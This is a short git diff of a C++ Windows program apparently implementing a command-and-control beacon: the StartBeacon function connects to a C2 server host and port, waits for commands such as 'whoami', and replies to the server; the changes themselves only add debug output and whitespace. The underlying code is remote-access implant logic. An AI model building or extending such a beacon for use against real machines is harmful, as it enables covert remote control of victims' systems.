@@ -137,7 +137,7 @@ void StartBeacon(char* C2Server, int C2Port)
 		// Version comparison - whether compiled version of sockets is compatible with the older versions
 		WSAStartup(MAKEWORD(2,2), &wsversion);
 
-		std::cout << "[DBG] Creating new socket again..\n";
+		std::cout << "[DBG] Creating new socket..\n";
 		// WSASocket vs socket - same functionality, WSA.. has more options to work with.
         tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
@@ -152,7 +152,7 @@ void StartBeacon(char* C2Server, int C2Port)
 			WSACleanup();
 			continue;
 		}
-		
+
 		// Else connection successfull..
 		else {
 			std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
@@ -161,10 +161,11 @@ void StartBeacon(char* C2Server, int C2Port)
 			// Connection verification block START
 			char RecvData[1024] = "";
 			memset(RecvData, 0, sizeof(RecvData));
-		
+			
 			// here waits for any data input from Server
 			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
-			
+			std::cout << "[DBG] 1st Recv: " << RecvData << std::endl;
+
 			if (RecvCode <= 0){
 				std::cout << "[DBG] RECVCODE = 0\n";
 				closesocket(tcpsock);
@@ -173,7 +174,6 @@ void StartBeacon(char* C2Server, int C2Port)
 			}
 			// Connection verification block END
 			// ------------------
-
 
 			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
 			if (strcmp(RecvData, "whoami\n") == 0) {
@@ -214,6 +214,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				continue;
 			}
 			else {
+				std::cout << "[DBG]  Command received: " << RecvData << std::endl;
 				char buffer[20] = "Invalid command\n";
 				send(tcpsock,buffer,strlen(buffer)+1,0);
 				memset(buffer, 0, sizeof(buffer));
